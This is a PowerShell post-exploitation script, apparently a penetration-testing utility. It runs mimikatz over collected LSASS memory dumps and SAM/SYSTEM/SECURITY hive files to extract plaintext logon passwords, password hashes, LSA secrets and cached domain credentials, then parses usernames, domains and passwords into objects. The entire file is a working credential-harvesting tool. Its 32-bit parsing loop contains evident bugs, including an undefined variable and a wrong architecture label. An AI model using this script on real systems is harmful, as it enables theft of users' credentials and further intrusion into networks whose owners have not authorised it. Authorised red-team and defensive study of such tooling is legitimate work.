	<#
 	.SYNOPSIS
	This script attempts to parse password dumps. It creates good text files and OK variable output.
	
	Runs mimikatz on a pile of .dmp, sam, system, and security files, parses to text files, and attempts to put them into varaibles.

	Function: Invoke-ParseMimikatz
	Author: Matt Kelly, @breakersall
	Required Dependencies: PSv3, MimiKatz

	.PARAMETER LootDirectory

	Directory containing loot.
	
	.PARAMETER BinsPath

	Supply the path containing required bins.

	.EXAMPLE
	
	Invoke-MimikatzParser -BinsPath C:\Temp\Mimikatz -LootDirectory C:\Temp\Passwords
	#>
Function Invoke-ParseMimikatz
{
	[CmdletBinding()]
	Param(
			
			[Parameter(Mandatory=$false,
					   ParameterSetName = "All",
					   ValueFromPipelineByPropertyName=$true)]
			[ValidateScript({Test-Path $_})]
			[string]$BinsPath,

			[Parameter(Mandatory=$false,
					   ParameterSetName = "All",
					   ValueFromPipelineByPropertyName=$true)]
			[ValidateScript({Test-Path $_})]
			[string]$LootDirectory = (Get-Location)			
		)
	
	$Directory = Get-Location


	Function MimikatzLsassExtract ($Computer)
	{
		$TextDeliminator1 = "echo **********$Computer Mimikatz64 LSASS Output************* >> `"$Directory\Mimikatz-LSASS-OUT-64.txt`""
		$TextDeliminator2 = "echo **********$Computer Mimikatz32 LSASS Output************* >> `"$Directory\Mimikatz-LSASS-OUT-32.txt`""
		$Expressions64 = "`"$BinsPath\x64\mimikatz.exe`" -a " + "`"sekurlsa::minidump " + $LootDirectory + "\" + "$Computer" + ".dmp`"" + " -a `"sekurlsa::logonPasswords full`" -a " + "`"exit`"" + " >> `"$Directory" +"\Mimikatz-LSASS-OUT-64.txt`""
		$Expressions32 = "`"$BinsPath\Win32\mimikatz.exe`" -a " + "`"sekurlsa::minidump " + $LootDirectory + "\" + "$Computer" + ".dmp`"" + " -a `"sekurlsa::logonPasswords full`" -a " + "`"exit`"" + " >> `"$Directory" +"\Mimikatz-LSASS-OUT-32.txt`""
		$TextDeliminator1 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		$Expressions64 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		$TextDeliminator2 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		$Expressions32 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		Set-Location $BinsPath
        $test= .\mimikatzpassword.cmd  2>$null
		Remove-Item $BinsPath\mimikatzpassword.cmd
		Set-Location $Directory
	}
	Function MimikatzHiveDump ($Computer)
	{
		$TextDeliminator1 = "echo **************************************************$Computer Mimikatz SAM Output*********************************************************** >> `"$Directory\sam-hashes.txt`"" 
		$TextDeliminator2 = "echo **************************************************$Computer Mimikatz LSA Secrets and Cache Output******************************************************************** >> `"$Directory\system-cache.txt`""
		$TextDeliminator3 = "echo ************************************************************************************************************************************************************************************************** >> `"$Directory\sam-hashes.txt`""
		$TextDeliminator4 = "echo ************************************************************************************************************************************************************************************************** >> `"$Directory\system-cache.txt`""
		$SamDump = "`"$BinsPath\x64\mimikatz.exe`" -a " + "`"lsadump::sam " + $LootDirectory + "\$Computer" + ".SYSTEM" + " $LootDirectory" + "\$Computer" + ".SAM`"" + " -a " + "`"exit`"" + " >> `"$Directory" +"\sam-hashes.txt`""
		$CacheDump = "`"$BinsPath\x64\mimikatz.exe`" -a " + "`"lsadump::secrets " + $LootDirectory + "\$Computer" + ".SYSTEM" + " $LootDirectory" + "\$Computer" + ".SECURITY`"" + " -a " + "`"lsadump::cache " + $LootDirectory + "\$Computer" + ".SYSTEM" + " $LootDirectory" + "\$Computer" + ".SECURITY`"" + " -a " + "`"exit`"" + " >> `"$Directory" +"\system-cache.txt`""
		$TextDeliminator1 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		$SamDump | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		$TextDeliminator2 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		$CacheDump | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		$TextDeliminator3 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd 
		$TextDeliminator3 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd 
		$TextDeliminator3 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd 
		$TextDeliminator4 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd 
		$TextDeliminator4 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd 
		$TextDeliminator4 | Out-File -Append -Encoding ascii $BinsPath\mimikatzpassword.cmd
		Set-Location $BinsPath
        $test= .\mimikatzpassword.cmd  2>$null
		#Remove-Item $BinsPath\mimikatzpassword.cmd
		Set-Location $Directory		
	}
	$PSExecCommand = ""
	Function ParseMimiLsass
		{
			$UnameRegex = '^*[Username]{8}'
			$DomainRegex = '^*[Domain]{6}'
			$PassRegex = '^*[Password]{8}[ ][:]'
			$Domains = select-string -Path $Directory\Mimikatz-LSASS-OUT-64.txt -Pattern $DomainRegex  | Select-Object Line
			$Usernames = select-string -Path $Directory\Mimikatz-LSASS-OUT-64.txt -Pattern $UnameRegex  | Select-Object Line
			$Passwords = select-string -Path $Directory\Mimikatz-LSASS-OUT-64.txt -Pattern $PassRegex  | Select-Object Line
			$Domains32 = select-string -Path $Directory\Mimikatz-LSASS-OUT-32.txt -Pattern $DomainRegex  | Select-Object Line
			$Usernames32 = select-string -Path $Directory\Mimikatz-LSASS-OUT-32.txt -Pattern $UnameRegex  | Select-Object Line
			$Passwords32 = select-string -Path $Directory\Mimikatz-LSASS-OUT-32.txt -Pattern $PassRegex  | Select-Object Line
			$Success = @()
			[int]$i = "0"
			foreach ($Username in $Usernames)
			{
				
				[string]$Dom = $Domains[$i]
				[string]$User = $Username
				[string]$Pass = $Passwords[$i]
				
				
				
				$i = $i + 1
									$Passw = $Pass.Split(":")[1..3]
									$Passwo = $Passw -Join("") -Replace "}",""
									$Doma = $Dom.Split(":")[1] -Replace "}",""
									$Usern = $User.Split(":")[1] -Replace "}",""
									if($Passwo -eq "")
									{
										$Passwo = "(null)"
									}
									if($Doma -eq "")
									{
										$Doma = "(null)"
									}
									elseif ($Doma -match "Basic command")
									{
											$Doma = "(null)"
									}
									if ($Usern -notcontains "`$")
									{
										$SuccessLogin = [ordered]@{
														Architecture = "64 Bit"
														Domain = $Doma
														UserName = $Usern
														Password = $Passwo
													}
										$SuccessLoginObj = [pscustomobject]$SuccessLogin
										$Success += $SuccessLoginObj
									}
				}
			[int]$i = "0"
			foreach ($Username in $Usernames32)
			{
				
				[string]$Dom = $Domains32[$i]
				[string]$User = $Username32
				[string]$Pass = $Passwords32[$i]
				
				
				
				$i = $i + 1
									$Passw = $Pass.Split(":")[1..3]
									$Passwo = $Passw -Join("") -Replace "}",""
									$Doma = $Dom.Split(":")[1] -Replace "}",""
									$Usern = $User.Split(":")[1] -Replace "}",""
									if($Passwo -eq "")
									{
										$Passwo = "(null)"
									}
									if($Doma -eq "")
									{
										$Doma = "(null)"
									}
									elseif ($Doma -match "Basic command")
									{
											$Doma = "(null)"
									}
									if ($Usern -notcontains "`$")
									{
										$SuccessLogin = [ordered]@{
														Architecture = "64 Bit"
														Domain = $Doma
														UserName = $Usern
														Password = $Passwo
													}
										$SuccessLoginObj = [pscustomobject]$SuccessLogin
										$Success += $SuccessLoginObj
									}
				}
		return $Success
	}

	cd $LootDirectory
	$MemDumps = Get-ChildItem *.dmp | Select-Object -ExpandProperty Name
	$RegDumps = Get-ChildItem *.SAM | Select-Object -ExpandProperty Name
	Write-Host "Mem Dumps is $MemDumps"
	Write-Host "Reg Dumps is $RegDumps"
	foreach ($MemDump in $MemDumps)
	{
		$MemDumpComp = $MemDump.Replace(".dmp","")
		MimikatzLsassExtract ($MemDumpComp)
	}
		$PassExis64 = Test-Path $Directory\Mimikatz-LSASS-OUT-64.txt
		$PassExis32 = Test-Path $Directory\Mimikatz-LSASS-OUT-32.txt
		if ($PassExis64)
		{
			ParseMimiLsass
		}
	foreach ($RegDump in $RegDumps)
	{
		$RegDumpComp = $RegDump.Replace(".SAM","")
		MimikatzHiveDump ($RegDumpComp)
	}
}
	